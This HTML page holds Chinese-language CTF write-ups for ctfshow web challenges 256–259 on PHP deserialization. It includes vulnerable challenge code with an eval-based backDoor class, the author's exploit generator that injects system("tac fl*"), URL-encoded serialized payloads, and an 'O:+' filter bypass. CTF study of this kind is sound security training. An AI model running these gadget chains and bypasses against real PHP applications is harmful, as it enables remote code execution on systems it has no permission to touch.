<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip){</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password){</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              }</span><br></pre></td></tr></table></div></figure>

<p>&#x6240;&#x4EE5;&#x4FEE;&#x6539;get&#x91CC;&#x9762;&#x4F20;&#x53C2;&#x7684;username&#x6216;&#x8005;password&#xFF1B;&#x518D;&#x4FEE;&#x6539;&#x5E8F;&#x5217;&#x5316;&#x7684;cookie&#x6570;&#x636E;&#x91CC;&#x9762;&#x7684;username&#x548C;password</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;ctfShowUser&quot;:3:{s:8:&quot;username&quot;;s:6:&quot;xxxxxx&quot;;s:8:&quot;password&quot;;s:2:&quot;hh&quot;;s:5:&quot;isVip&quot;;b:1;}</span><br><span class="line">//</span><br><span class="line">%4f%3a%31%31%3a%22%63%74%66%53%68%6f%77%55%73%65%72%22%3a%33%3a%7b%73%3a%38%3a%22%75%73%65%72%6e%61%6d%65%22%3b%73%3a%36%3a%22%78%78%78%78%78%78%22%3b%73%3a%38%3a%22%70%61%73%73%77%6f%72%64%22%3b%73%3a%32%3a%22%68%68%22%3b%73%3a%35%3a%22%69%73%56%69%70%22%3b%62%3a%31%3b%7d</span><br><span class="line">#</span><br><span class="line">O:11:&quot;ctfShowUser&quot;:2:{s:8:&quot;password&quot;;s:2:&quot;hh&quot;;s:5:&quot;isVip&quot;;b:1;}</span><br><span class="line">//</span><br><span class="line">%4f%3a%31%31%3a%22%63%74%66%53%68%6f%77%55%73%65%72%22%3a%32%3a%7b%73%3a%38%3a%22%70%61%73%73%77%6f%72%64%22%3b%73%3a%32%3a%22%68%68%22%3b%73%3a%35%3a%22%69%73%56%69%70%22%3b%62%3a%31%3b%7d</span><br></pre></td></tr></table></div></figure>


        <h3 id="257">
          <a href="#257" class="heading-link"><i class="fas fa-link"></i></a><a href="#257" class="headerlink" title="257"></a>257</h3>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&apos;xxxxxx&apos;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&apos;xxxxxx&apos;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&apos;info&apos;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    }</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    }</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">}</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&apos;xxxxxx&apos;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&apos;username&apos;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&apos;password&apos;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>)){</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&apos;user&apos;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></div></figure>





<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">ctfShowUser</span> <span class="keyword">as</span> <span class="title">GlobalCtfShowUser</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&apos;xxxxxx&apos;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&apos;xxxxxx&apos;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&apos;backDoor&apos;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    }</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    }</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">}</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&apos;xxxxxx&apos;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;    <span class="comment">//&#x8FD9;&#x4E00;&#x4E2A;return&#x53EF;&#x4EE5;&#x5229;&#x7528;&#xFF0C;&#x7528;&#x6765;&#x8FD4;&#x56DE;eval&#x547D;&#x4EE4;&#x6267;&#x884C;&#x7684;&#x7ED3;&#x679C;&#xFF1B;&#x8003;&#x8651;&#x4F7F;&#x7528;$sth = new backdoor;sth-&gt;code = &apos;tac f*&apos;&#xFF0C;&#x6216;&#x8005;</span></span><br><span class="line">                               <span class="comment">//$sth = new ctfshowuser;&#x7136;&#x540E;&#x8BA9;sth&#x8C03;&#x7528;backdoor&#x7684;getinfo&#x65B9;&#x6CD5;&#xFF1B;&#x4E5F;&#x8BB8;&#x6B64;&#x5904;&#x8981;&#x5148;&#x5B9E;&#x4F8B;&#x5316;&#x4E00;&#x4E2A;backdoor&#xFF1F;&#x7ED9;&#x8FD9;&#x4E2A;backdoor</span></span><br><span class="line">                               <span class="comment">//&#x8D4B;code&#x7684;&#x503C;&#xFF0C;&#x7136;&#x540E;&#x8BA9;sth&#x8C03;&#x7528;&#x8FD9;&#x4E2A;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;&#x540E;&#x7684;&#x65B9;&#x6CD5;getinfo</span></span><br><span class="line">                               <span class="comment">//&#x9700;&#x8981;&#x8C03;&#x7528;getInfo&#x65B9;&#x6CD5;&#xFF0C;&#x5C31;&#x9700;&#x8981;&#x6267;&#x884C;&#x4E00;&#x6B21;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x64CD;&#x4F5C;&#x8FDB;&#x884C;destruct,&#x518D;&#x770B;construct&#x8003;&#x8651;&#x5728;&#x6B64;&#x5904;&#x7ED5;&#x8FC7;</span></span><br><span class="line">                               <span class="comment">//&#x4F46;&#x662F;&#x6709;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;isVIP&#x662F;private&#x5C5E;&#x6027;&#xFF0C;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x8BB0;&#x5F97;&#x597D;&#x50CF;&#x662F;&#x7ED9;ctfshowuser&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x5C5E;&#x6027;public isVIP&#xFF0C;&#x8BA9;&#x8FD9;&#x4E2A;isVIP&#x4E3A;&#x771F;&#xFF0C;</span></span><br><span class="line">                               <span class="comment">//&#x907F;&#x514D;&#x8C03;&#x7528;&#x539F;&#x6709;&#x7684;private isVIP;&#x4E0D;&#x8FC7;&#xFF01;&#xFF01;&#xFF01;&#x597D;&#x50CF;&#x6CA1;&#x6709;&#x8981;&#x7528;&#x5230;isVIP&#x5224;&#x65AD;&#x771F;&#x5047;&#x7684;&#x5730;&#x65B9;</span></span><br><span class="line">                               <span class="comment">//&#x8FD8;&#x8981;&#x7ED5;&#x8FC7;info&#x8FD9;&#x4E2A;&#x7C7B;&#x7684;private user&#x6210;&#x5458;&#xFF08;&#x4F3C;&#x4E4E;&#x662F;&#x4F7F;&#x7528;backdoor&#x7C7B;&#x7684;getinfo&#x53BB;&#x7ED5;&#x8FC7;&#x7684;&#xFF09;&#xFF1B;&#x8FD9;code&#x6CA1;&#x6709;&#x8D4B;&#x503C;&#xFF0C;&#x6240;&#x4EE5;&#x539F;&#x6765;&#x7684;&#x4EE3;&#x7801;&#x91CC;&#x7684;</span></span><br><span class="line">                               <span class="comment">//code&#x53EF;&#x4EE5;&#x4EFB;&#x610F;&#x6539;&#x5199;</span></span><br><span class="line">                               <span class="comment">//&#x95EE;&#x9898;&#x6765;&#x4E86;&#xFF0C;&#x5982;&#x4F55;&#x4E0D;&#x8C03;&#x7528;info&#x7684;getinfo&#x800C;&#x53BB;&#x8C03;&#x7528;backdoor&#x7684;getinfo&#x5462;</span></span><br><span class="line">                               <span class="comment">//&#x96BE;&#x9053;&#x662F;&#x5728;&#x81EA;&#x5DF1;&#x7684;payload&#x7684;PHP&#x4EE3;&#x7801;&#x6539;&#x5199;isVIP&#x548C;class&#x7684;&#x503C;&#x5417;&#xFF1F;&#xFF01;</span></span><br><span class="line">                               <span class="comment">//&#x611F;&#x89C9;&#x8FD9;&#x91CC;&#x662F;&#x5BF9;private&#x548C;public&#x7684;&#x4F5C;&#x7528;&#x8303;&#x56F4;&#x4E0D;&#x7406;&#x89E3;</span></span><br><span class="line">                               <span class="comment">//&#x597D;&#x5427;&#xFF0C;private&#x76F4;&#x8BF4;&#x53EA;&#x80FD;&#x5728;&#x672C;&#x7C7B;&#x91CC;&#x9762;&#x4F7F;&#x7528;&#xFF0C;&#x53C8;&#x6CA1;&#x8BF4;&#x4E0D;&#x80FD;&#x8BA9;&#x5B9E;&#x4F8B;&#x5316;&#x540E;&#x7684;&#x5BF9;&#x8C61;&#x4FEE;&#x6539;</span></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span> = <span class="string">&apos;system(&quot;tac fl*&quot;);&apos;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$sth</span> = <span class="keyword">new</span> ctfShowUser;</span><br><span class="line">       <span class="comment">//&#x867D;&#x7136;&#x4F46;&#x662F;&#xFF0C;&#x522B;&#x5FD8;&#x4E86;eval&#x662F;&#x6267;&#x884C;PHP&#x4EE3;&#x7801;&#xFF0C;&#x800C;&#x4E0D;&#x662F;Linux&#x547D;&#x4EE4;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$sth</span>));        <span class="comment">//&#x800C;&#x4E14;PHP&#x6709;&#x76F4;&#x63A5;urlencode&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x4E0D;&#x7528;&#x518D;&#x4F7F;&#x7528;Python&#x811A;&#x672C;&#x53BB;&#x8F6C;&#x5566;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// $username=$_GET[&apos;username&apos;];</span></span><br><span class="line"><span class="comment">// $password=$_GET[&apos;password&apos;];</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// if(isset($username) &amp;&amp; isset($password)){</span></span><br><span class="line"><span class="comment">//     $user = unserialize($_COOKIE[&apos;user&apos;]);</span></span><br><span class="line"><span class="comment">//     $user-&gt;login($username,$password);</span></span><br><span class="line"><span class="comment">// }</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">O%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span>isVip%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span><span class="keyword">class</span>%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>backDoor%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>backDoor%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>system%<span class="number">28</span>%<span class="number">22</span>tac+fl%<span class="number">2</span>A%<span class="number">22</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></div></figure>


        <h3 id="258">
          <a href="#258" class="heading-link"><i class="fas fa-link"></i></a><a href="#258" class="headerlink" title="258"></a>258</h3>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&apos;xxxxxx&apos;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&apos;xxxxxx&apos;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&apos;info&apos;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    }</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    }</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">}</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&apos;xxxxxx&apos;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&apos;username&apos;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&apos;password&apos;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>)){</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&apos;/[oc]:\d+:/i&apos;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&apos;user&apos;</span>])){</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&apos;user&apos;</span>]);</span><br><span class="line">    }</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></div></figure>

<p>&#x8FC7;&#x6EE4;&#x4E86;<code>O:&#x6570;&#x5B57;</code>&#xFF0C;<code>c:&#x6570;&#x5B57;</code></p>
<p>&#x4F7F;&#x7528;<code>O:+</code>&#x6765;&#x7ED5;&#x8FC7;&#xFF1B;</p>
<p>&#x770B;&#x522B;&#x4EBA;&#x7684;wp&#x5B66;&#x5230;&#x4E86;&#x4EE5;&#x4E0B;payload&#xFF1A;</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a = serialize(new ctfShowUser);</span><br><span class="line">$a = str_replace(&apos;O:&apos;,&apos;O:+&apos;,$a);</span><br><span class="line">echo urlencode($a);</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A5%3A%22class%22%3BO%3A%2B4%3A%22info%22%3A1%3A%7Bs%3A4%3A%22user%22%3Bs%3A6%3A%22xxxxxx%22%3B%7D%7D</span><br></pre></td></tr></table></div></figure>


        <h3 id="259">
          <a href="#259" class="heading-link"><i class="fas fa-link"></i></a><a href="#259" class="headerlink" title="259"></a>259</h3>
      <p>&#x8003;&#x70B9;&#xFF1A;soapclient &#x4E0E; crlf</p>
<hr>
<p>&#x51B2;&#x6D6A;&#x53D1;&#x73B0;&#x597D;&#x4E1C;&#x897F;</p>
<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://wooyun.kieran.top/#!/">WooYun&#x77E5;&#x8BC6;&#x5E93; (kieran.top)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://wooyun.2xss.cc/bugs.php?page=41">&#x6F0F;&#x6D1E;&#x5217;&#x8868; | &#x4E4C;&#x4E91;&#x7F51; | WooYun.org (2xss.cc)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<hr>
<p>&#x5404;&#x4F4D;&#x5E08;&#x5085;&#x7684;&#x53C2;&#x8003;&#x6587;&#x7AE0;&#xFF0C;&#x4ECE;&#x8FD9;&#x9053;&#x9898;&#x7684;wp&#x51FA;&#x53D1;&#xFF1A;</p>
<blockquote>
<p>HRS:http&#x8BF7;&#x6C42;&#x8D70;&#x79C1;  &#xFF1B;&#x4F1A;&#x8BDD;&#x56FA;&#x5B9A;&#x6F0F;&#x6D1E;&#xFF1F;&#x4F3C;&#x4E4E;&#x662F;&#x5728;&#x6539;&#x8BBF;&#x95EE;&#x8005;&#x7684;session&#xFF08;p&#x725B;&#x7684;&#x90A3;&#x7BC7;&#x6587;&#x7AE0;&#x91CC;&#x9762;&#x7684;&#xFF09;</p>
</blockquote>
<ul>
<li><input disabled type="checkbox"> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.cnblogs.com/li9club/p/12381847.html">&#x4ECB;&#x7ECD;&#x4E24;&#x4E2A;&#x8C03;&#x8BD5;http/https&#x4EA4;&#x4E92;&#x7684;&#x6A21;&#x62DF;&#x5DE5;&#x5177;&#x4E4B;&#x4E00;&#xFF1A;&#x4F7F;&#x7528;requestbin&#x7684;HTTPBin&#x68C0;&#x67E5;&#x4F60;&#x53D1;&#x9001;&#x7684;&#x6570;&#x636E; - li9club - &#x535A;&#x5BA2;&#x56ED; (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
